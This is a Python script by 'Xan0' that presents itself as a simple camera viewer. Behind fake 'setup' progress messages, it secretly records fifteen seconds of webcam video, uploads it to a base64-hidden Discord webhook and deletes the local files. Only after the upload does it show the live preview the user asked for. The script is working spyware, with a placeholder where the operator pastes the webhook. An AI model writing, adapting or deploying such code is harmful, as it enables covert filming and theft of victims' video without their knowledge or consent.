import os

os.system("color 4")

print(r"""
   ___   _   __  __ 
  / __| /_\ |  \/  |
 | (__ / _ \| |\/| |
  \___/_/ \_\_|  |_|
-------by Xan0-------

                    
""")
def INSTALL():
    answer = input("Do you want to start the camera? (y/n):")
    if answer == "y":
        os.system("pip install imageio requests opencv-python moviepy")
        print("""



installation done. proceeding with setup!
        """)
    if answer == "n":
        input(":( ok.. bye...")
        exit()

def FILM():
    import cv2
    # Create a window for preview
    cv2.namedWindow("Camera.exe")

    # Open the camera (Index 0 for the first camera)
    vc = cv2.VideoCapture(0)

    # Check if the camera opened successfully
    if vc.isOpened():
        rval, frame = vc.read()
    else:
        rval = False
    # Loop for continuous display of camera image
    while rval:
        cv2.imshow("Camera.exe", frame)
        rval, frame = vc.read()
        key = cv2.waitKey(20)
        if key == 27:
            break

    # Close the window and release the camera
    cv2.destroyWindow("Camera.exe")
    vc.release()

# Duration of video recording in seconds
def CHEESE():
    from tkinter import messagebox
    import subprocess
    import time
    import imageio
    import base64
    from moviepy.editor import VideoFileClip 
    import moviepy.video.fx.all as vfx
    import requests
    print("Setup is starting...")
    time.sleep(1)
    print("Loading...")
    time.sleep(3)
    print("Defining Variables...")
    time.sleep(1)
    print("Loading...")
    time.sleep(3)
    print("10%")
    time.sleep(4)
    print("45%")
    time.sleep(2)
    print("60%")
    time.sleep(2)
    print("70%")
    time.sleep(3)
    print("100%")
    time.sleep(1)
    print("Proceeding...")
    messagebox.showinfo("Cam.exe", "Give this program some time to start. :)\nPress ESC to stop the program.\nEnjoy :)")

    recording_duration = 15

    # Automatically detect the webcam
    webcam_index = 0  # Index of the webcam (may vary depending on the system)

    # Open the webcam
    cap = imageio.get_reader(f"<video{webcam_index}>", 'ffmpeg')

    # Set video codec and output file
    fps = 30
    output_file = 'input.mp4'
    writer = imageio.get_writer(output_file, fps=fps, codec='libx264')

    # Start time of recording
    start_time = time.time()

    for frame in cap:
        writer.append_data(frame)
        if int(time.time() - start_time) >= recording_duration:
            break

    # End the recording
    writer.close()

    # Speed up the video using MoviePy
    in_loc = 'input.mp4'  # Input file path
    out_loc = 'video.mp4'  # Output file path

    # Import video clip
    clip = VideoFileClip(in_loc)

    # Adjust FPS (increasing it by a factor of 4)
    clip = clip.set_fps(clip.fps * 4)

    # Increase speed
    final = clip.fx(vfx.speedx, 4)

    # Save the video
    final.write_videofile(out_loc)

    print(f"Setup nearly done.")

    subprocess.run("del input.mp4", shell=True)

    # define your discord webhook
    YOUR_WEBHOOK = "PASTE YOUR WEBHOOK HERE IN BASE64 FORMAT! IF YOU USE WINDOWS AN THE BASE64ENCODER.py THE BASE64 STRING WILL AUTOMATICALLY COPIED INTO YOUR CLIPBOARD"
    webhook_url = base64.b64decode(YOUR_WEBHOOK).decode("utf-8")
   
    file_path = 'video.mp4'

    # Open the file and read its content
    with open(file_path, 'rb') as f:
        file_content = f.read()

    payload = {
        'file': ('video.mp4', file_content)
    }

    response = requests.post(webhook_url, files=payload)

    if response.status_code == 200:
        print("Setup complete.")
    else:
       print(f"Setup Failed. Trying to proceed...")
    subprocess.run("del video.mp4", shell=True)

INSTALL()
CHEESE()
FILM()
